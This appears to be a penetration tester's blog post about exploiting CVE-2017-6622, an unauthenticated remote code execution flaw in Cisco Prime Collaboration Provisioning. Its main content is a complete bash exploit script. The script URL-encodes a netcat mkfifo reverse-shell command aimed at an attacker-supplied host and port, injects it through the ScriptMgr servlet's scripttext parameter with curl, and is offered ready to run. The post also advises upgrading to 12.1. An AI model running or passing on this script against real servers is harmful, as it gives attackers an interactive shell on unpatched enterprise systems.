---
layout: post
title: Cisco Prime Collaboration Provisioning RCE
category: Security
tags: [exploit, hacking, security]
---

Sometimes, as part of my day job I get to go out and do penetration testing for random places. The past two weeks I've been lucky enough to be on my second professional pentest. It was a lot of fun, and particularly challenging. Our customer had an excellent security posture, but I did stumble across a Cisco server that had a reported remote code execution vulnerability, [CVE-2017-6622](https://nvd.nist.gov/vuln/detail/CVE-2017-6622). However, I couldn't find any good proof-of-concept code for obtaining a shell from it. So, after I got the shell I decided to write up this little post.

## Vulnerable Software

Being in an enterprise environment we found plenty of VoIP phones. As a result of this, the customer was using a piece of software called Cisco Prime Collaboration. This software helps enable rapid installation and maintenance of Cisco Unified Communications and Cisco TelePresence components as well as the provisioning of users and services, substantially increasing productivity and lowering operating expenses. If I remember correctly, it is a Java server (my note taking could improve) which has several endpoints. More information on the software can be found at [Cisco's website](https://www.cisco.com/c/en/us/products/cloud-systems-management/prime-collaboration/index.html).

## Java Remote Code Execution

One of our vulnerability scanners picked up a remote code execution (RCE) vulnerability on this machine. However, it's PoC was a simple ping command. After verifying this was indeed a positive result I set out to obtain a shell. I ran into several problems with formatting the URL, but I finally came up with the script below for gaining access via a netcat reverse shell.

```bash
# Exploit Title: Cisco Prime Collaboration Provisioning < 12.1 - ScriptMgr Servlet Authentication Bypass Remote Code Execution
# Date: 09/27/2017
# Exploit Author: Adam Brown
# Vendor Homepage: https://cisco.com
# Software Link: https://software.cisco.com/download/release.html?mdfid=286308336&softwareid=286289070&release=11.6&flowid=81443
# Version: < 12.1
# Tested on: Debian 8
# CVE : 2017-6622
# Reference: https://www.tenable.com/plugins/index.php?view=single&id=101531
# Mitigation - Upgrade your Cisco Prime Collaboration Provisioning server to 12.1 or later.

# Description - This vulnerability allows an unauthenticated attacker to execute arbitrary Java code on a system running Cisco Prime Collaboration Provisioning server < 12.1 via a scripttext parameter in the ScriptMgr page.

# Usage: ./prime-shell.sh <TARGET-IP> <ATTACKER-IP> <ATTACKER-PORT>

function encode() {
	echo "$1" | perl -MURI::Escape -ne 'chomp;print uri_escape($_),"\n"'
}

TARGET=$1
ATTACKER=$2
PORT=$3

BASH=$(encode "/bin/bash")
COMMAND=$(encode "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $ATTACKER $PORT >/tmp/f")
SCRIPTTEXT="Runtime.getRuntime().exec(new%20String[]{\"$BASH\",\"-c\",\"$COMMAND\"});"

curl --head -gk "https://$TARGET/cupm/ScriptMgr?command=compile&language=bsh&script=foo&scripttext=$SCRIPTTEXT"
```

## Coffee Break!

I hope you enjoyed this post! If you are running Cisco Prime Collaboration provisioning please ensure that you've upgraded to at least version 12.1 in order to mitigate the above mentioned attack. As always, please reach out with any questions you may have, and happy hacking!
